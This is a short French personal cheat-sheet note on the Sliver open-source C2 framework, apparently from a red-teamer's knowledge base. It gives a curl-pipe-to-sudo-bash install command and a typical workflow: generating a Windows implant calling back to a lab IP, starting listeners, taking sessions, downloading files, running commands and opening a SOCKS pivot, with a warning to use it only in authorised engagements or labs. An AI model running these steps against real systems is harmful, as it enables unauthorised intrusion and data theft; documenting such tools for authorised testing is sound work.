---
titre: "Sliver"
tags: [Outils, C2, red-team, post-exploitation]
source: https://github.com/BishopFox/sliver
---

# Sliver

**Framework C2 open source** (BishopFox), en Go. Très utilisé comme alternative
libre à Cobalt Strike : implants multi-plateformes, communications variées
(mTLS, HTTP(S), DNS, WireGuard), pivot, exécution de BOF/assemblies .NET.
À côté de mon [[AdaptixC2]].

> ⚠️ Outil offensif : **engagement red team autorisé / lab** uniquement. Cf. `README`.

## Installation
```bash
curl https://sliver.sh/install | sudo bash        # serveur + client
# ou binaires depuis les releases GitHub
sliver-server           # démarre le serveur (mode console)
```

## Flux type
```text
sliver > generate --mtls 10.10.14.3 --os windows --save /tmp   # créer un implant
sliver > http                       # démarrer un listener HTTP
# (exécuter l'implant sur la cible de test)
sliver > sessions                   # lister les implants connectés
sliver > use <session-id>
sliver (SESSION) > info ; ls ; download ; execute -o whoami
sliver (SESSION) > socks5 start     # pivot SOCKS
```

## Réflexe
`generate` (implant) → listener (`http`/`mtls`) → `sessions`/`use`. Multi-joueurs
via `multiplayer`. Rester strictement dans le **scope** et journaliser. Autres C2 :
[[Havoc]], [[Mythic]].
